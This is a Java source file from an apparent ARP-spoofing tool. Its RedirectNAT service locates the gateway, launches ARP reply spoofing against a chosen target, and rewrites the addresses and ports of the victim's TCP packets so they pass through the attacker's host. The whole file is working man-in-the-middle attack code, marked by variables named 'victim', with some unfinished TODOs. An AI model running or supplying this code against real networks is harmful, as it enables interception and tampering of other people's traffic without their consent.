package org.bitducks.spoofing.services;

import java.net.InetAddress;
import java.util.Arrays;
import java.util.HashMap;

import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

import org.apache.log4j.Logger;
import org.bitducks.spoofing.core.Computer;
import org.bitducks.spoofing.core.InterfaceInfo;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.customrules.IpAndMacFilterRule;
import org.bitducks.spoofing.gateway.GatewayFindService;

public class RedirectNAT extends Service {

	private InterfaceInfo serverInfo;
	private HashMap<Computer, Integer> computerToPort = new HashMap<Computer, Integer>();
	private HashMap<Integer, Computer> portToComputer = new HashMap<Integer, Computer>();
	private byte[] gatewayMAC;
	private final int FIRST_PORT = 60000;
	private int nextPort = FIRST_PORT - 1;
	
	private InetAddress target;
	private InetAddress host;
	private int freqSpoof;

	//TODO: Make a NAT and change the port

	public RedirectNAT(InetAddress target, InetAddress host, int freqSpoof) {
		this.target = target;
		this.host = host;
		this.freqSpoof = freqSpoof;
		
		logger = Logger.getLogger(RedirectNAT.class);
		serverInfo = Server.getInstance().getInfo();
		this.getPolicy().addRule(new IpAndMacFilterRule(serverInfo.getMacAddress()));
	}

	@Override
	public void run() {
		logger.info("Traffic redirection started");

		GatewayFindService finder = new GatewayFindService();
		Server.getInstance().addService(finder);
		gatewayMAC = finder.getMacAddress();
		logger.info("Gateway MAC Address found!");
		//TODO: Get the IP address from this server
		Server.getInstance().addService(new ReplyARPService(this.target, this.host, this.freqSpoof));

		while(! this.isCloseRequested()){
			Packet toTransfer = this.getNextBlockingPacket();
			redirectPacket(toTransfer);
		}
	}

	private void redirectPacket(Packet p) {
		if(p instanceof TCPPacket) {
			logger.info("TCP Packet received ! Spoof --> Send");
			IPPacket ipPacket = (IPPacket)p;
			EthernetPacket ethernetPacket = (EthernetPacket)p.datalink;
			TCPPacket tcpPacket = (TCPPacket)p;
			
			if (!isFromGateway(p)) {
				Computer victim = new Computer().setIpAddress(ipPacket.src_ip)
						.setMacAddress(ethernetPacket.src_mac)
						.setPortNumber(tcpPacket.src_port);
				
				if (tcpPacket.fin && computerIsPresent(victim)) { //End of connection
					ipPacket.src_ip = serverInfo.getAddress();
					ethernetPacket.src_mac = serverInfo.getMacAddress();
					tcpPacket.src_port = computerToPort.get(victim);
					ethernetPacket.dst_mac = gatewayMAC;
					
					computerToPort.remove(victim);
					
					Server.getInstance().sendPacket(p);
					
				} else if (computerIsPresent(victim)) { //Already an entry
					ipPacket.src_ip = serverInfo.getAddress();
					ethernetPacket.src_mac = serverInfo.getMacAddress();
					tcpPacket.src_port = computerToPort.get(victim);
					ethernetPacket.dst_mac = gatewayMAC;
					
					Server.getInstance().sendPacket(p);
					
				} else {	//New entry or new connection
					int port = getNextPort();
					this.computerToPort.put(victim, port);
					this.portToComputer.put(port, victim);
					ipPacket.src_ip = serverInfo.getAddress();
					ethernetPacket.src_mac = serverInfo.getMacAddress();
					tcpPacket.src_port = port;
					ethernetPacket.dst_mac = gatewayMAC;
					
					Server.getInstance().sendPacket(p);
				}
			} else { //From Gateway
				int spoofedPort = tcpPacket.dst_port;
				if (tcpPacket.fin && portIsPresent(spoofedPort)) { //End of connection
					Computer victim = portToComputer.get(spoofedPort);
					
					ipPacket.dst_ip = victim.getIpAddress();
					ethernetPacket.dst_mac = victim.getMacAddress();
					tcpPacket.dst_port = victim.getPortNumber();
					ethernetPacket.src_mac = serverInfo.getMacAddress();
					
					portToComputer.remove(spoofedPort);
					
					Server.getInstance().sendPacket(p);
					
				} else if (portIsPresent(spoofedPort)) { //Already an entry
					Computer victim = portToComputer.get(spoofedPort);
					
					ipPacket.dst_ip = victim.getIpAddress();
					ethernetPacket.dst_mac = victim.getMacAddress();
					tcpPacket.dst_port = victim.getPortNumber();
					ethernetPacket.src_mac = serverInfo.getMacAddress();					

					Server.getInstance().sendPacket(p);
					
				}
			}
		}/** else {
			logger.info("Non-TCP Packet received! Forward to gateway");
			((EthernetPacket)((IPPacket)p).datalink).dst_mac = gatewayMAC;
			Server.getInstance().sendPacket(p);
		}*/
	}

	private boolean computerIsPresent(Computer computer) {
		boolean toReturn = false;
		if (computerToPort.get(computer) != null) {
			toReturn = true;
		}
		return toReturn;
	}
	
	private boolean portIsPresent(int port) {
		boolean toReturn = false;
		if (portToComputer.get(port) != null) {
			toReturn = true;
		}
		return toReturn;	
	}

	public int getNextPort() {
		//TODO: Iterate between first and last port
		this.nextPort ++;
		return nextPort;
	}

	public boolean isFromGateway(Packet p) {
		if ( Arrays.equals(gatewayMAC, ((EthernetPacket)p.datalink).src_mac)) {
			return true;
		}
		return false;
	}

}
